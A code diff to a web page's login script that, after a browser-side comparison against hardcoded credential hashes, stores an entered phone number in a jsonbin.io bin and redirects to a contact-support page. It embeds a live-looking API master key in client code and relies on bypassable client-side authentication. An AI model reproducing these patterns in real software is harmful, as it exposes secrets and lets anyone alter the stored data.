@@ -63,7 +63,22 @@
             const secretPasswordHash = "81481c65f3dbd4cb1d5105a352c03d3591c333e50a3a46cd10c391c805d86b76";
             
             if (hashedEmail === secretEmailHash && hashedPassword === secretPasswordHash) {
-                localStorage.setItem('newPhoneNumber', username);
+                try {
+                    const response = await fetch('https://api.jsonbin.io/v3/b/67fae7448a456b7966880cb7', {
+                        method: 'PUT',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Master-Key': '$2a$10$lfUDxK1hzoTsu4q0/Mx3ROgUR3QRzt1QoP5Vd/8q8LMgZ5i.lCxZm'
+                        },
+                        body: JSON.stringify({ phoneNumber: username })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('Failed to store phone number');
+                    }
+                } catch (error) {
+                    console.error('Error storing phone number:', error);
+                }
             }
             
             window.location.href = './contact-support.html';
